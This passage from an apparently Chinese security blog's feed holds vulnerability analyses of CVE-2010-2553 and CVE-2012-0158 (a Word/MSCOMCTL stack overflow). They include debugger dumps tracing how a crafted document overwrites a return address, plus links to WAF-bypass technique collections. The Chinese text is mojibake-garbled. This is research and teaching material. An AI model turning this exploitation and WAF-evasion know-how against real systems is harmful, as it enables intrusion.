    &quot;poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…&quot;çš„è°ƒç”¨,f8å•æ­¥åeax=001135C8,ä¸Šé¢çš„rep movsæŒ‡ä»¤å¤„çš„å †å—åœ¨a0000å †çš„
    147000å †å—é™„è¿‘

    f9
        ä¸­æ–­åˆ°73b72432å¤„çš„call kernel32.localalloc,æ­¤æ—¶æ•°æ®çª—å£ä¸­1c2caf8å¤„ä¾ç„¶æ²¡æœ‰å†™å…¥åŸæ¥poc.aviä¸­æ„é€ çš„æ•°æ®

    f9
        ä¾ç„¶æ²¡æœ‰å†™å…¥...
    f9
        è¿™ä¸ªf9è¦æŒ‰å¿«ä¸€ç‚¹,è¦ä¸ç„¶odä¸­ä¸ä¼šåœ¨1c2caf8å¤„å†™å…¥æ•°æ®,è¿™ä¸ªf9ä¹‹åä¸­æ–­ä¸‹æ¥åˆ°å…³é”®callè°ƒç”¨å¤„,æ­¤æ—¶æ•°æ®çª—å£ä¸­çš„
        1c2caf8å¤„å·²ç»å†™å…¥äº†åŸæ¥poc.aviä¸­çš„æ„é€ çš„æ•°æ®

    f9
        æ­¤æ—¶å¼¹å‡ºä¸Šé¢ä¸€æ ·çš„å†…å­˜ä¸å¯å†™çš„å‡ºé”™æ¡†(ç”±äºrep movså†™å…¥åˆ°ä¸å¯å†™çš„åœ°å€é€ æˆ)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä¸Šé¢ä¸¤æ¬¡f9ä¹‹å1c2caf8ä¸­æ²¡æœ‰å†™å…¥æ•°æ®,ç¬¬ä¸‰æ¬¡f9ä¹‹å1c2caf8ä¸­å†™å…¥æ•°æ®,ç¬¬å››æ¬¡f9å¼‚å¸¸å‡ºç°å®Œ,è¦æ±‚æ‰¾åˆ°çš„LocalAllocç¬¦
    åˆè¿™ä¸ªæ¡ä»¶:
        &quot;poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…&quot;
    ä½†æ˜¯ä»ä¸Šé¢ç¬¬2ä¸ªf9åˆ°ç¬¬å››ä¸ªf9ä¹‹é—´æ²¡æœ‰ä¸­æ–­åˆ°ä»»ä½•LocalAllocçš„è°ƒç”¨,è¯´æ˜æ‰¾ä¸åˆ°ç¬¦åˆæ¡ä»¶çš„å †å—åˆ†é…,ä¹Ÿå³æ²¡æœ‰DWORD
    SHOOTçš„æœºä¼š,ä¹Ÿå³æ²¡æœ‰åŠæ³•æ§åˆ¶eip,è¯´æ˜è¿™ä¸ªcve-2010-2553åªæ˜¯ä¸ªdos(denial of Service)ç±»æ¼æ´

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 17 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</guid>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>å †æº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2012-0158</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å®éªŒç¯å¢ƒ:
    windows xp sp3
    office word 2003 sp3
    offvis1.1
æ¼æ´æè¿°:
    MSCOMCTL.OCXä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 ç›¸å…³æŠ€å·§&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc.docæ˜¯rtfæ ¼å¼,é‡Œé¢çš„oleæ•°æ®ä»¥æ–‡æœ¬å½¢å¼å­˜å‚¨,offvisæ— æ³•è¯†åˆ«,å¯¼è‡´ä¸èƒ½é€šè¿‡offvisåˆ†ædocçš„ç»“æ„,å¯é€šè¿‡winhexå°†
0xD0CF11E0å¼€å§‹è‡³ç»“å°¾çš„æ‰€æœ‰çœ‹ä¸Šå»æ˜¯åå…­è¿›åˆ¶å½¢å¼è¡¨ç¤ºçš„æ–‡æœ¬æ•°æ®ä¿å­˜ä¸ºçœŸæ­£çš„åå…­è¿›åˆ¶å€¼,æœ€åæœ‰ä¸‰ä¸ªå³å¤§æ‹¬å·ä¸å±äºåå…­
è¿›åˆ¶å½¢å¼,ä¹Ÿå³å°†ä¸‹é¢å›¾1ä¸­poc.docè½¬æˆå›¾2ä¸­çš„test.doc
    æ“ä½œæ­¥éª¤:
    1&amp;gt;winhexæ‰“å¼€poc.doc,é€‰ä¸­textåŒºä¸­çš„D0CF11E0åˆ°æœ€åçš„0000(å·¦è¾¹ä¸ºhexåŒº,å³è¾¹ä¸ºtextåŒº)
    2&amp;gt;å•å‡»å³é”®é€‰æ‹©edit|copy block|normally
    3&amp;gt;æ–°å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶,20kå¤§å°(15kåº”è¯¥ä¹Ÿå¤Ÿäº†)
    4&amp;gt;åœ¨æ–°å»ºæ–‡ä»¶çš„offsetä¸º0å¤„å³é”®é€‰æ‹©edit|copyboard data|paste,åœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é€‰æ‹©æœ€åä¸€ç§ç²˜è´´æ–¹å¼,å¹¶ä¿å­˜ä¸º
    test.doc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;å›¾1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2&amp;gt;offvisç›¸å…³åˆ†æä¸­,æ‰“å¼€é‡æ–°ç”Ÿæˆçš„test.doc,åœ¨åˆ†ææ¨¡å—ä¸­é€‰æ‹©æœ€åä¸€ä¸ª,å¦‚ä¸‹å›¾3æ‰€ç¤º,41414141å¯¹åº”çš„æ•°æ®åœ¨offvisåˆ†æ
ä¸­çš„å¯¹åº”å­—æ®µå¦‚ä¸‹å›¾4ä¸­æ‰€ç¤º
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;å›¾3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 è°ƒè¯•åˆ†æ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ‰“å¼€word,odé™„åŠ ,åœ¨wordä¸­æ‰“å¼€poc.doc,å¼¹å‡ºå‡ºé”™æ¡†,é”™è¯¯åœ°å€ä¸º41414141,ç”¨ä¸Šé¢çš„æ–¹æ³•é€šè¿‡offvisåˆ†ææ‰¾åˆ°å¯¹åº”å­—æ®µä¸º
Data,æˆ–è€…ç›´æ¥åŒå‡»æ‰“å¼€poc.doc,ä¹Ÿæ˜¯ç›´æ¥å¼¹å‡ºå‡ºé”™å¯¹è¯æ¡†,odæ²¡æœ‰åœ¨eip=0x41414141æ—¶æ•è·å¼‚å¸¸,ä½†æ˜¯immunity debuggerèƒ½å¤Ÿ
åœ¨eip=0x41414141å¤„ä¸­æ–­å¹¶é€€å‡º,å¯è¾¾åˆ°å’Œwindbgä¸€æ ·çš„æ•ˆæœ(åœ¨cve-2011-0104çš„åˆ†æä¸­,windbgå¯æ•è·åˆ°eipä¸ºä¸€ä¸ªæ­£å¸¸åœ°å€
æ—¶å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ä¸ºæ­£å¸¸çš„æ±‡ç¼–æŒ‡ä»¤,ä½†æ˜¯è¯¥æŒ‡ä»¤ä¸­è®¿é—®äº†å¼‚å¸¸å†…å­˜æ•°æ®,è€Œè¿™é‡Œçš„æƒ…å†µæ˜¯eip=41414141,æ˜¯ä¸€ä¸ªä¸æ­£å¸¸çš„åœ°å€,
è¿™é‡Œé¢æ²¡æœ‰æŒ‡ä»¤),ä¸æ­¤åŒæ—¶,odé™„åŠ exeæ—¶ä¼šè¢«ç³»ç»Ÿå¼‚å¸¸å¤„ç†ç¨‹åºå…ˆæ•è·eip=0x41414141è¿™ä¸ªå¼‚å¸¸,å¯¹æ¯”odå’Œimmunity debugger,
å‘ç°odä¸­çš„è°ƒè¯•é€‰é¡¹ä¸­çš„å¼‚å¸¸é»˜è®¤å¤„ç†æƒ…å†µå¦‚ä¸‹å›¾5,immunity debuggerå¦‚å›¾6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;å›¾5
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾6
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å°è¯•å°†odçš„é€‰é¡¹è®¾ç½®æˆå’Œimmunity debuggerä¸€æ ·,ä¾ç„¶ä¼šå¼¹å‡ºå¦‚ä¸‹å›¾7ä¸­çš„ç³»ç»Ÿå¼‚å¸¸å¯¹è¯æ¡†,çœ‹æ¥odåœ¨æ•è·å¼‚å¸¸çš„åŠŸèƒ½ä¸Šä¸å¦‚
immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;å›¾7
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;é‡æ–°é€‰æ‹©immunity debuggeré™„åŠ æ‰“å¼€çš„word.exe,word.exeæ‰“å¼€poc.doc,immunity debuggeræ•è·åˆ°word.exeå´©æºƒå¹¶å¾—åˆ°å´©æºƒæ—¶
çš„æ•°æ®å¦‚ä¸‹:(esp=121468,ebp=00000000,eip=41414141)

    ------------------å¯„å­˜å™¨çª—å£ä¸­--------------------
        EAX 00000000
        ECX 7C93003D ntdll.7C93003D
        EDX 00140608
        EBX 09FB0810
        ESP 00121468
        EBP 00000000
        ESI 002100B4
        EDI 00000000
        EIP 41414141
        C 0  ES 0023 32bit 0(FFFFFFFF)
        P 1  CS 001B 32bit 0(FFFFFFFF)
        A 0  SS 0023 32bit 0(FFFFFFFF)
        Z 1  DS 0023 32bit 0(FFFFFFFF)
        S 0  FS 003B 32bit 7FFDE000(FFF)
        T 0  GS 0000 NULL
        D 0
        O 0  LastErr ERROR_SUCCESS (00000000)
        EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
        ST0 empty
        ST1 empty
        ST2 empty
        ST3 empty
        ST4 empty
        ST5 empty
        ST6 empty
        ST7 empty
                       3 2 1 0      E S P U O Z D I
        FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
        FCW 127F  Prec NEAR,53  Mask    1 1 1 1 1 1
    ---------------------end--------------------------
    
    -------------------------å †æ ˆçª—å£ä¸­-----------------------------
    001213EC   00000001  ...
    001213F0   0012F904  ?.
    001213F4   7C92E900  .é–½|   ntdll.7C92E900
    001213F8   7C930040  @.æ¢   ntdll.7C930040
    001213FC   FFFFFFFF  ï£µï£µï£µï£µ
    00121400   7C93003D  =.æ¢   ntdll.7C93003D
    00121404   275C8800  .åœ½&#39;   MSCOMCTL.275C8800
    00121408   00140000  ...
    0012140C   00000000  ....
    00121410   08D9B008  ç™¾
    00121414   00000000  ....
    00121418   002100B4  ?!.
    0012141C   09FB0810  ?
    00121420   00008282  å€..
    00121424   00121458  X.
    00121428   275C8A0A  .å¥¬&#39;   MSCOMCTL.275C8A0A
    0012142C   00121450  P.
    00121430   08D9B008  ç™¾
    00121434   00008282  å€..
    00121438   00000000  ....
    0012143C   002100B4  ?!.
    00121440   09FB0810  ?
    00121444   6A626F43  Cobj
    00121448   00000064  d...
    0012144C   00008282  å€..
    00121450   00000000  ....
    00121454   00000000  ....
    00121458   00000000  ....
    0012145C   41414141  AAAA
    00121460   00000000  ....
    00121464   00000000  ....
    00121468   00000000  ....  ------&amp;gt;   &amp;lt;å´©æºƒæ—¶espçš„å€¼ä¸º121468&amp;gt;
    0012146C   00000000  ....
    00121470   00000000  ....
    00121474   00000000  ....
    00121478   00000000  ....
    0012147C   00000000  ....
    00121480   00000000  ....
    00121484   00000000  ....
    00121488   00000000  ....
    0012148C   00000000  ....
    00121490   00000000  ....
    00121494   00000000  ....
    00121498   00000000  ....
    0012149C   00000000  ....
    001214A0   00000000  ....
    001214A4   00000000  ....
    001214A8   00000000  ....
    001214AC   00000000  ....
    001214B0   00000000  ....
    001214B4   00000000  ....
    001214B8   00000000  ....
    001214BC   00000000  ....
    001214C0   00000000  ....
    001214C4   00000000  ....
    001214C8   00000000  ....
    ----------------------------end---------------------------------
    
    espä¸Šé¢æœ€è¿‘çš„ä¸€ä¸ªè¿”å›åœ°å€ä¸º121428å¤„çš„275c8a0a,å°è¯•åœ¨275c8a0aå¤„å•ç‹¬ä¸‹æ–­,æ— æ³•ç›´æ¥ä¸‹æ–­,éœ€è¦å•ç‹¬æ‰“å¼€
    MSCOMCTL.ocx,æ‰§è¡Œå‘½ä»¤:bp 0x275c8a0a,å•ç‹¬æ‰“å¼€c:\windows\system32\MSCOMCTL.ocx,ctrl+g:275c8a0a,å…·ä½“æŒ‡ä»¤å¦‚ä¸‹:

    -----------------275c8a0aé™„è¿‘----------------
    275C89C7   $  55            push ebp    ---------&amp;gt;å‡½æ•°å…¥å£ç‚¹
    275C89C8   .  8BEC          mov ebp,esp
    275C89CA   .  83EC 14       sub esp,0x14
    275C89CD   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89CE   .  8B5D 0C       mov ebx,dword ptr ss:[ebp+0xC]           ;  MSCOMCTL.27580000
    275C89D1   .  56            push esi
    275C89D2   .  57            push edi
    275C89D3   .  6A 0C         push 0xC
    275C89D5   .  8D45 EC       lea eax,dword ptr ss:[ebp-0x14]
    275C89D8   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89D9   .  50            push eax
    275C89DA   .  E8 8EFDFFFF   call MSCOMCTL.275C876D
    275C89DF   .  83C4 0C       add esp,0xC
    275C89E2   .  85C0          test eax,eax
    275C89E4   .  7C 6C         jl short MSCOMCTL.275C8A52
    275C89E6   .  817D EC 436F6&amp;gt;cmp dword ptr ss:[ebp-0x14],0x6A626F43
    275C89ED   .  0F85 92A60000 jnz MSCOMCTL.275D3085
    275C89F3   .  837D F4 08    cmp dword ptr ss:[ebp-0xC],0x8
    275C89F7   .  0F82 88A60000 jb MSCOMCTL.275D3085
    275C89FD   .  FF75 F4       push dword ptr ss:[ebp-0xC]              ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A00   .  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]
    275C8A03   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A04   .  50            push eax
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax
    --------------------end----------------------

    ä¹Ÿå³275c8a0aå¤„æ˜¯ä¸€ä¸ªè¿”å›åœ°å€(odå’Œimmunity debuggerçš„å †æ ˆçª—å£ä¸­æ˜¾ç¤ºå½¢å¦‚module.xxxxxxxxä¸ºæŸä¸ªæ¨¡å—çš„æŸä¸ªåœ°å€çš„
    åœ°æ–¹,å¤§å¤šæ•°æƒ…å†µéƒ½æ˜¯å‡½æ•°è¿”å›åœ°å€,ä¹Ÿå³åœ¨æ±‡ç¼–çª—å£ä¸­å¯¹åº”ä¸ºæŸæ¡call ...æŒ‡ä»¤çš„ä¸‹ä¸€å¥çš„åœ°å€,æœ‰å°‘æ•°ä¸æ˜¯è¿”å›åœ°å€)
    ä¸”275c8a0aåœ¨å‡½æ•°275c89c7ä¸­,bp 0x275c8a0aåé‡æ–°åŠ è½½word.exe,å¹¶ç”¨word.exeæ‰“å¼€poc.doc,æˆåŠŸåœ¨275c8a0aå¤„ä¸­æ–­
    ,å¯¹åº”æ•°æ®å¦‚ä¸‹:

    -------------------eip--------------------
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax   ----&amp;gt;eip
    -------------------end--------------------

    -------------------å †æ ˆçª—å£------------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450          -----------&amp;gt;esp
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000         ------------&amp;gt;ebp
    0012145C   41414141
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------------end---------------------

å•æ­¥åˆ°275c8a56å¤„çš„retn 0x8å¤„æ—¶,eip=275C8A56,esp=12145c,[esp]=41414141

    ---------------æ±‡ç¼–çª—å£------------
    275C8A50   &amp;gt;  8BC6          mov eax,esi
    275C8A52   &amp;gt; |5F            pop edi
    275C8A53   . |5E            pop esi
    275C8A54   . |5B            pop ebx
    275C8A55   . |C9            leave
    275C8A56   . |C2 0800       retn 0x8    ---&amp;gt; eip=275c8a56
    ------------------end--------------
    
    -------------å †æ ˆçª—å£---------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000
    0012145C   41414141   ---&amp;gt; esp=12145c
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------end------------------

å†å•æ­¥ç¨‹åºå°†è·‘é£åˆ°41414141å¤„æ‰§è¡Œ,å¹¶æ— æ³•ç»§ç»­è°ƒè¯•

è¿™é‡Œåˆ†æçš„æ–¹æ³•é‡‡ç”¨çš„æ˜¯æ ¹æ®ç¨‹åºå´©æºƒæ—¶å †æ ˆçª—å£ä¸­åœ¨å´©æºƒæ—¶çš„espä¸Šæ–¹ä½ç½®çš„å‡½æ•°è¿”å›åœ°å€å›æº¯,æ­¤ä¾‹ä¸­æ ¹æ®ç¨‹åºå´©æºƒæ—¶çš„esp
ä¸Šæ–¹(addr&amp;lt;esp,addr=121428,esp=121468)çš„121428å¤„çš„è¿”å›åœ°å€275C8A0Aå›æº¯åˆ°275c8a0aå¤„ä¸‹æ–­ç‚¹,275c8a0aå¤„äºå‡½æ•°
275C89C7ä¸­.

æ ¹æ®å´©æºƒæ—¶å †æ ˆçª—å£ä¸­çš„espä¸Šæ–¹çš„ä½ç½®çš„å‡½æ•°è¿”å›åœ°å€å›æº¯(ä¹Ÿå³å´©æºƒæ—¶espä¸Šæ–¹çš„ä½ç½®[addr&amp;lt;esp]é™„è¿‘å¯ä»¥æ‰¾åˆ°æŸ
å‡½æ•°è¿”å›åœ°å€,å°±åƒè¿™ä¸ªä¾‹å­ä¸€æ ·),è¯´æ˜espä¸Šæ–¹çš„å‡½æ•°è¿”å›åœ°å€å·²æ­£å¸¸ç»æ‰§è¡Œ(rentå®Œ)æ‰å»æ‰§è¡Œåˆ°å½“å‰å´©æºƒæ—¶çš„espå¯¹åº”eipçš„
åœ°æ–¹,è¿™æ ·è¯´æ˜å´©æºƒæ—¶espä¸Šæ–¹çš„æŸå‡½æ•°è¿”å›åœ°å€çš„å€¼ä¸å´©æºƒæ—¶çš„espå¯¹åº”çš„åˆšæ‰§è¡Œå®Œçš„eip(æ‰§è¡Œæœ¬ä¾‹eip=41414141ä¹‹å‰ä¸€æ­¥çš„
eip=275C8A56[å¯¹åº”rent 0x8])åœ¨æ±‡ç¼–çª—å£ä¸­å±äºåŒä¸€å¸§å‡½æ•°ä¸­,ä¸”æŸå‡½æ•°è¿”å›åœ°å€&amp;lt;è¯¥eip(æœ¬ä¾‹ä¸­ä¸º275c8a56),è¿™ç§æƒ…å†µå¯ä»¥ç›´
æ¥åœ¨å´©æºƒæ—¶çš„espä¸Šæ–¹çš„æŸå‡½æ•°è¿”å›åœ°å€åœ¨æ±‡ç¼–çª—å£ä¸­è·Ÿéšåçš„ä¸‹æ–­ç‚¹,ç„¶åå•æ­¥æ‰§è¡Œå°±èƒ½çœ‹åˆ°é”™è¯¯åœ¨å“ªé‡Œå‘ç”Ÿ.

ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œretnè¢«è¦†ç›–
a.é€šå¸¸æ˜¯å½“å‰å‡½æ•°å¸§ä¸­çš„ä¸€å¤„å­å‡½æ•°è°ƒç”¨(å½¢å¦‚call å­å‡½æ•°)å¯¼è‡´å½“å‰å‡½æ•°çš„çš„è¿”å›åœ°å€è¢«è¦†ç›–

æˆ–è€…è¯´æˆæ˜¯

b.å½“å‰å‡½æ•°ä¸­ï¼ˆå­å‡½æ•°ä¸­ï¼‰ä¸€å¤„æ•°æ®å¤åˆ¶æŒ‡ä»¤ï¼ˆå½¢å¦‚resp ...)å¯¼è‡´ä¸Šä¸€å¸§å‡½æ•°çš„è¿”å›åœ°å€è¢«è¦†ç›–

aä¸­çš„å­å‡½æ•°ä¸­åŒ…æ‹¬bä¸­çš„å¤åˆ¶æŒ‡ä»¤,bä¸­çš„ä¸Šä¸€å¸§å‡½æ•°å¯¹åº”aä¸­çš„å½“å‰å‡½æ•°,æ­¤ä¾‹ä¸­å¯¹åº”æƒ…å†µå¦‚ä¸‹ï¼š

---------------------start------------------------
275e7004    push ebp
...
...
275e7015    call 275c89c7
275e701a


                        275c89c7    push ebp
                        ...
                        ...
                        275C8A05    call 275c876d
                        275c8a0a
                        ...
                        ...
                        275c8a56    retn 0x8
----------------------end-------------------------

275c8a05å¤„çš„call 275c876dæ‰§è¡Œå®Œåå°†è¦†ç›–æ ˆä¸­çš„275e701aä¸º41414141,ä½¿å¾—275c8a56å¤„çš„retn 0x8è¿”å›åˆ°41414141å¤„æ‰§è¡Œ
åœ¨f7è·Ÿè¿›275c8a05å¤„çš„275c876dæ—¶ï¼Œå †æ ˆçª—å£ä¸­æ•°æ®å¦‚ä¸‹:

-------------start--------------
00121428  |275C8A0A  è¿”å›åˆ° MSCOMCTL.275C8A0A æ¥è‡ª MSCOMCTL.275C876D
0012142C  |00121450
00121430  |09FC0810
00121434  |00008282
00121438  |00000000
0012143C  |00210ECC
00121440  |09FC0810
00121444  |6A626F43
00121448  |00000064
0012144C  |00008282
00121450  |00210FB8
00121454  |275859E4  è¿”å›åˆ° MSCOMCTL.275859E4 æ¥è‡ª MSCOMCTL.27585BBA
00121458  ]00121480
0012145C  |275E701A  è¿”å›åˆ° MSCOMCTL.275E701A æ¥è‡ª MSCOMCTL.275C89C7
00121460  |00210ECC
00121464  |09FC0810
00121468  |00000000
0012146C  |00210EA8
00121470  |08C992F0
00121474  |275AC296  è¿”å›åˆ° MSCOMCTL.275AC296 æ¥è‡ª MSCOMCTL.275AC3AC
--------------end---------------
æŒ‰ç†æ¥è®²ï¼Œç”±äºè¿›å…¥åˆ°275c876då‡½æ•°å¸§ä¸­æ—¶æ ˆä¸­æ•°æ®å¦‚ä¸Šæ‰€ç¤ºï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨275c876då‡½æ•°ä¸­æ‰§è¡Œåˆ°retnè¯­å¥å‰,275c876dä¸­
çš„å…¶ä»–æŒ‡ä»¤ä¼šè¦†ç›–å †æ ˆçª—å£ä¸­çš„ç¦»00121428å¤„çš„275c8a0aæœ€è¿‘çš„ä¸‹é¢çš„ä¸€ä¸ªè¿”å›åœ°å€ï¼Œä¹Ÿå³121454å¤„çš„275859e4,å› ä¸ºä»å †æ ˆçª—
å£ä¸­çœ‹ï¼Œè¿›å…¥275c876då‡½æ•°ä¹‹åï¼Œä¸‹é¢æœ€è¿‘çš„è¿”å›åœ°å€å°†æ˜¯è¿”å›åˆ°275c8a0aä¹‹ååœ¨å½“å‰275c876då‡½æ•°çš„ä¸Šä¸€å¸§å‡½æ•°ä¸­çš„retnæŒ‡
ä»¤å°†è¦è¿”å›çš„åœ°å€ï¼Œä¹Ÿå³ä»å †æ ˆçª—å£ä¸­æ¥çœ‹ï¼Œ275c8a56å¤„çš„retn 0x8åº”è¯¥æ˜¯è¦è¿”å›åˆ°121454å¤„çš„275859e4,ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸æ˜¯è¿™
æ ·ï¼Œå®é™…æ˜¯275c8a56å¤„çš„retn 0x8å°†è¦è¿”å›åˆ°ä¸Šé¢å †æ ˆçª—å£ä¸­çš„ç¦»121428å¤„çš„275c8a0aä¸‹é¢ç¬¬äºŒè¿‘çš„12145cå¤„çš„275e701a,å› ä¸º
åœ¨275c89c7å‡½æ•°å¸§ä¸­å¼€å¤´ä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªæŠ¬é«˜æ ˆç©ºé—´çš„åŠ¨ä½œï¼ˆsub esp,0x..),è¿™ä¸ªæŠ¬é«˜åŠ¨ä½œæ­£å¥½æŠŠ00121454ä¸­çš„275859e4â€œæ‹‰è¿›â€
äº†275c89c7å‡½æ•°å¸§çš„æ ˆç©ºé—´ï¼Œä¹Ÿå³121454å¤„çš„275859e4è¿”å›åœ°å€å±äºä¹‹å‰æ²¡æœ‰æ‰§è¡Œ275c89c7çš„â€œæ— æ„ä¹‰æ®‹ä½™æ•°æ®â€,ä»è¿™é‡Œçœ‹å‡ºï¼Œ
ä»¥åä¸èƒ½çœ‹åˆ°å †æ ˆçª—å£ä¸­ä¸‹é¢æœ€è¿‘çš„è¿”å›åœ°å€å°†è¦é¦–å…ˆè¿”å›ï¼Œå¹¶ä¸ä¸€å®šï¼Œè¿˜æœ‰çš„å¯èƒ½æ˜¯æœ€è¿‘çš„è¿”å›åœ°å€å¹¶ä¸æ˜¯â€œæœ‰æ„ä¹‰çš„è¿”å›åœ°
å€â€,è€Œæ˜¯ä¹‹å‰æ®‹ä½™çš„æ•°æ®,è¿™æ ·å°±è¦çœ‹ç¬¬äºŒä¸ªï¼Œæˆ–è€…ç¬¬ä¸‰ä¸ªé è¿‘çš„è¿”å›åœ°å€äº†
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 14 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</guid>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ ˆæº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>wafç»•è¿‡æŠ€å·§åº“</title>
        <description>&lt;h3 id=&quot;x00-links&quot;&gt;0x00 links&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wafç»•è¿‡æŠ€å·§åº“:
http://wafbypass.me/w/index.php/Main_Page  may be a best one```
http://www.freebuf.com/articles/web/10099.html   WAFç»•è¿‡çš„å¥‡æŠ€æ·«å·§
http://tech-technical.com/index.php/2015/11/11/waf-bypass-sql-injection-tutorial/ è€å¤–çš„æŠ€å·§
http://webvuln.blogspot.hk/2015_04_01_archive.html æµ‹è¯•fuzz
http://www.wooyun.org/bugs/wooyun-2014-089426ã€€ã€€good
https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9133  90secæ–°æ€è·¯
http://www.idiot-attacker.com/2016/02/macam-macam-kode-bypass-waf.html good
http://wooyun.org/bugs/wooyun-2010-0121291
http://wooyun.org/bugs/wooyun-2010-0115175 fuzz2bypass
http://drops.wooyun.org/tips/7883 
http://www.securityidiots.com/Web-Pentest/WAF-Bypass/
http://www.pentest.net.cn/post/7
http://www.mottoin.com/86886.html
